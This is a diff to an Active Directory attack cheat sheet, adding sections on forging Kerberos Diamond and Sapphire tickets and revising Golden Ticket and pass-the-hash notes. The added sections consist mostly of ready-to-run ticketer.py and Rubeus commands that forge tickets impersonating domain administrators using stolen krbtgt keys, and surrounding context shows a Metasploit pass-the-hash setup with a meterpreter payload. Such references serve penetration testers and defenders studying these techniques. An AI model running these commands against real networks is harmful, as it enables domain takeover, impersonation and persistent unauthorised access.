@@ -56,6 +56,8 @@
       - [Using Meterpreter](#using-meterpreter)
       - [Using a ticket on Linux](#using-a-ticket-on-linux)
     - [Pass-the-Ticket Silver Tickets](#pass-the-ticket-silver-tickets)
+    - [Pass-the-Ticket Diamond Tickets](#pass-the-ticket-diamond-tickets)
+    - [Pass-the-Ticket Sapphire Tickets](#pass-the-ticket-sapphire-tickets)
     - [Kerberoasting](#kerberoasting)
     - [KRB_AS_REP Roasting](#krbasrep-roasting)
     - [Pass-the-Hash](#pass-the-hash)
@@ -1605,9 +1607,11 @@ Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -
 
 ### Pass-the-Ticket Golden Tickets
 
-Forging a TGT require the `krbtgt` NTLM hash
+Forging a TGT require:
+* the `krbtgt` NT hash
+* since recently, we cannot use a non-existent account name as a result of `CVE-2021-42287` mitigations
 
-> The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used.
+> The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt NT hash must be used.
 
 #### Using Mimikatz
 
@@ -1707,6 +1711,38 @@ Interesting services to target with a silver ticket :
 
 Mitigations:
 * Set the attribute "Account is Sensitive and Cannot be Delegated" to prevent lateral movement with the generated ticket.
+
+
+### Pass-the-Ticket Diamond Tickets
+
+> Request a legit low-priv TGT and recalculate only the PAC field providing the krbtgt encryption key
+
+Require: 
+* krbtgt NT Hash
+* krbtgt AES key
+
+```ps1
+ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'
+
+Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
+```
+
+
+### Pass-the-Ticket Sapphire Tickets
+
+> Requesting the target user's PAC with `S4U2self+U2U` exchange during TGS-REQ(P) (PKINIT).
+
+The goal is to mimic the PAC field as close as possible to a legitimate one.
+
+Require:
+* [Impacket PR#1411](https://github.com/SecureAuthCorp/impacket/pull/1411)
+* krbtgt AES key
+
+```ps1
+# baduser argument will be ignored
+ticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'
+```
+
 
 ### Kerberoasting
 
@@ -1862,7 +1898,7 @@ The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since 
   set SMBUser jarrieta
   set SMBPass nastyCutt3r  
   # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
-  # NOTE2: Require the full NTLM hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
+  # NOTE2: Require the full NT hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
   set PAYLOAD windows/meterpreter/bind_tcp
   run
   shell
@@ -1893,7 +1929,7 @@ $ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 
 ### OverPass-the-Hash (pass the key)
 
-In this technique, instead of passing the hash directly, we use the NTLM hash of an account to request a valid Kerberost ticket (TGT).
+In this technique, instead of passing the hash directly, we use the NT hash of an account to request a valid Kerberost ticket (TGT).
 
 #### Using impacket
 
@@ -3993,3 +4029,6 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
 * [Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
 * [The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
+* [Diamond tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond)
+* [A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
+* [Sapphire tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
